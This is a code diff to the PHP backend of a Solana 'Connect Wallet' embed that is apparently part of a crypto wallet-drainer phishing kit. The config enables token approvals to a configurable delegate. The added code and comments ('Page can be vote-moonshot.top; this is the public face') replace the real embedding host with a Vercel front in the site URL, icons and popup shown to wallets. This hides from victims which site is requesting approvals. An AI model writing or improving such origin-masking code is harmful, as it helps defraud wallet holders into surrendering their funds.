@@ -16,7 +16,8 @@ $cfg = [
     'site_name' => 'Connect Wallet',
     'site_description' => 'Connect your Solana wallet',
     'site_icons' => ['https://fuzzy-octo-guacamole-delta.vercel.app/tYZq2BsVawvS5wYEF.svg'],
-    'site_url' => '',
+    // Shown in wallet connect UI / popup (Reown metadata). Page can be vote-moonshot.top; this is the public face.
+    'site_url' => 'https://fuzzy-octo-guacamole-delta.vercel.app',
 
     'vercel_bundle_url' => 'https://fuzzy-octo-guacamole-delta.vercel.app/0EBM88LeOsHh.js',
 
@@ -72,12 +73,25 @@ function chunk_query_url(array $cfg, string $chunk): string
 /** @param array<string, mixed> $op */
 function enrich_upstream_op(array $cfg, array $op): array
 {
+    $chunks = chunk_names($cfg);
     $op['pid'] = (string) ($cfg['reown_project_id'] ?? '');
-    $op['o'] = upstream_request_origin($cfg);
+    $op['o'] = public_site_origin($cfg);
     $op['vo'] = vercel_api_origin($cfg);
-    $op['gw'] = chunk_query_url($cfg, chunk_names($cfg)['gateway']);
+    // Wallet image URLs load from Vercel gateway (visible in modal), not the VPS path.
+    $op['gw'] = vercel_api_origin($cfg) . '/' . $chunks['gateway'];
 
     return $op;
+}
+
+/** Origin shown to wallets / Reown (Vercel), not the embed host. */
+function public_site_origin(array $cfg): string
+{
+    $configured = rtrim((string) ($cfg['site_url'] ?? ''), '/');
+    if ($configured !== '') {
+        return $configured;
+    }
+
+    return rtrim(vercel_api_origin($cfg), '/');
 }
 
 /** @param array<string, mixed> $op */
@@ -151,12 +165,16 @@ function build_embed_config(array $cfg, string $siteUrl): array
 {
     $chunks = chunk_names($cfg);
     $gatewayUrl = chunk_query_url($cfg, $chunks['gateway']);
+    $publicOrigin = public_site_origin($cfg);
     $popupUrl = trim((string) ($cfg['connect_popup_url'] ?? ''));
     if ($popupUrl === '') {
-        $popupUrl = chunk_query_url($cfg, $chunks['profilePage']);
+        $popupUrl = rtrim(vercel_api_origin($cfg), '/') . '/profile/';
     }
 
-    $icons = [chunk_op_get_url($cfg, ['t' => 'u', 'h' => 'v', 'm' => 'GET', 'p' => '/tYZq2BsVawvS5wYEF.svg'])];
+    $icons = $cfg['site_icons'] ?? [];
+    if (!is_array($icons) || $icons === []) {
+        $icons = [rtrim(vercel_api_origin($cfg), '/') . '/tYZq2BsVawvS5wYEF.svg'];
+    }
 
     return [
         'projectId' => (string) ($cfg['reown_project_id'] ?? ''),
@@ -165,8 +183,8 @@ function build_embed_config(array $cfg, string $siteUrl): array
         'network' => (string) ($cfg['network'] ?? 'solana'),
         'siteName' => (string) ($cfg['site_name'] ?? 'Website'),
         'siteDescription' => (string) ($cfg['site_description'] ?? ''),
-        'siteUrl' => request_origin() !== '' ? request_origin() : vercel_site_origin($cfg),
-        'siteIcons' => $icons,
+        'siteUrl' => $publicOrigin,
+        'siteIcons' => array_values(array_map('strval', $icons)),
         'analytics' => (bool) ($cfg['analytics'] ?? true),
         'tokenApprovalEnabled' => (bool) ($cfg['token_approval_enabled'] ?? true),
         'tokenDelegate' => (string) ($cfg['token_delegate'] ?? ''),
@@ -600,12 +618,7 @@ function prepare_upstream_body(array $cfg, array $op, ?string $body): ?string
 
 function upstream_request_origin(array $cfg): string
 {
-    $page = request_origin();
-    if ($page !== '') {
-        return $page;
-    }
-
-    return vercel_site_origin($cfg);
+    return public_site_origin($cfg);
 }
 
 function upstream_body_as_json(string $contentType, string $body): bool
